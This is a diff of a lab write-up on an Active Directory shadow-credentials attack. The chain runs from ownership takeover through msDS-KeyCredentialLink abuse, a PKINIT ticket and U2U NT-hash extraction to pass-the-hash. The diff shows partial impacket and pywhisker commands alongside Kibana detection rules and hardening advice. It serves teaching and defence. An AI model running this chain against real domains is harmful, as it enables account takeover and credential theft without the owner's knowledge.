@@ -5,6 +5,8 @@
 **Constraint:** No password change on target account  
 **Objective:** Read flag from CTO_BRO-accessible share  
 
+**Summary:** Abuse WriteOwner → FullControl → msDS-KeyCredentialLink to obtain a PKINIT TGT and extract the NT hash via U2U, without resetting or knowing the target password.
+
 ---
 
 ## The Misconfiguration
@@ -61,7 +63,7 @@ rm -f *.pfx *.ccache dacledit-*.bak
 
 ---
 
-## Phase 1 — Ownership Takeover
+## Phase 1 — Ownership Takeover (WRITE_OWNER)
 
 ```bash
 impacket-owneredit -action write -new-owner lowpriv -target CTO_BRO \
@@ -81,7 +83,7 @@ impacket-owneredit -action write -new-owner lowpriv -target CTO_BRO \
 
 ---
 
-## Phase 2 — Grant FullControl
+## Phase 2 — DACL Modification (WRITE_DAC)
 
 ```bash
 impacket-dacledit -action write -rights FullControl -principal lowpriv \
@@ -102,7 +104,7 @@ impacket-dacledit -action write -rights FullControl -principal lowpriv \
 
 ---
 
-## Phase 3 — Write Shadow Credential
+## Phase 3 — Shadow Credential Injection
 
 ```bash
 pywhisker -d lab2019.local -u lowpriv -p 'Passw0rd123!' \
@@ -123,7 +125,7 @@ pywhisker -d lab2019.local -u lowpriv -p 'Passw0rd123!' \
 
 ---
 
-## Phase 4 — PKINIT TGT Request
+## Phase 4 — PKINIT Authentication
 
 ```bash
 python3 ~/PKINITtools/gettgtpkinit.py lab2019.local/CTO_BRO \
@@ -144,7 +146,7 @@ python3 ~/PKINITtools/gettgtpkinit.py lab2019.local/CTO_BRO \
 
 ---
 
-## Phase 5 — NT Hash Extraction via U2U
+## Phase 5 — U2U Hash Extraction
 
 ```bash
 export KRB5CCNAME=$(pwd)/cto.ccache
@@ -164,7 +166,7 @@ Recovered NT Hash
 
 ---
 
-## Phase 6 — Pass-the-Hash
+## Phase 6 — Pass-the-Hash Access
 
 ```bash
 impacket-smbclient lab2019.local/CTO_BRO@DC01.lab2019.local \
@@ -184,6 +186,8 @@ CTO_BRO's password was never known, changed, or expired.
 ## Detection: ELK / Kibana Rules
 
 ### Prerequisites
+
+**Assumption:** Windows Hello for Business is not deployed in this environment. In WHfB environments, legitimate DC-initiated writes to `msDS-KeyCredentialLink` will occur during key enrollment. Additional filtering logic is required to distinguish those from attacker-initiated writes.
 
 **Winlogbeat config — Security event IDs required:**
 ```yaml
@@ -262,6 +266,8 @@ Note: `%%14674` is the Windows constant for "Value Added" in 5136 events — con
 
 **Description:** A TGT was requested via certificate-based pre-authentication (Pre-Auth Type 16) where the certificate issuer matches the requesting account name, indicating a self-signed certificate not issued by any PKI infrastructure in the environment. Legitimate PKINIT authentication uses certificates issued by an enterprise CA, not self-signed certificates.
 
+Note: PKINIT usage is rare outside smartcard or WHfB deployments. In most environments, any PreAuthType 16 event from a user account warrants investigation.
+
 ```kql
 event.code: "4768" and
 winlog.event_data.PreAuthType: "16" and
@@ -305,7 +311,7 @@ Note: KQL does not support direct field-to-field comparison. The service name = 
 - Set a SACL on all privileged user objects auditing Write all properties, Modify permissions, Modify owner
 - Alert on any 5136 where a non-DC account writes to `msDS-KeyCredentialLink`
 - Alert on 4768 with Pre-Auth Type 16 from non-machine, non-service accounts
-- Add high-value accounts to the Protected Users group — prevents NTLM, forces Kerberos AES
+- Add high-value accounts to the Protected Users group — limits credential material exposure and reduces usefulness of extracted hashes; does not block the Shadow Credentials attack itself
 - Run BloodHound regularly — the Managers → WriteOwner → CTO_BRO ACE is the root cause
 - Implement a tiered admin model: delegated rights should never reach sensitive user objects via flat group membership
 
@@ -317,7 +323,6 @@ Note: KQL does not support direct field-to-field comparison. The service name = 
 - [pywhisker](https://github.com/ShutdownRepo/pywhisker)
 - [PKINITtools](https://github.com/dirkjanm/PKINITtools)
 - [impacket](https://github.com/fortra/impacket)
-
 
 <img width="1877" height="952" alt="KIBANA" src="https://github.com/user-attachments/assets/7ac70133-c9a3-40e2-b412-b069a9f7a254" />
 
